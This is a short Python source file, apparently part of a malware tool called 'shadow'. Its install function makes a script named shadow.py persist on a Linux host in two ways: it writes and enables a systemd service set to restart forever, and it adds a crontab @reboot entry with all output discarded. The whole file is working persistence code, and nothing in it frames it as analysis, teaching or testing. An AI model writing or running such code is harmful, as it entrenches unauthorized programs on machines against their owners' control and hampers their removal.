import os
import subprocess

def install():
    script_path = os.path.abspath("shadow.py")
    service = f"""[Unit]
Description=ShadowDaemon Service
After=network.target

[Service]
Type=simple
ExecStart=/usr/bin/python3 {script_path}
Restart=always
RestartSec=10

[Install]
WantedBy=multi-user.target
"""
    with open("/etc/systemd/system/shadow.service", "w") as f:
        f.write(service)
    subprocess.run(["systemctl", "enable", "shadow.service"], check=False)
    subprocess.run(["systemctl", "start", "shadow.service"], check=False)
    cron_cmd = f"@reboot python3 {script_path} > /dev/null 2>&1 &"
    subprocess.run(f'(crontab -l 2>/dev/null; echo "{cron_cmd}") | crontab -', shell=True)
    return "Persistence installed"
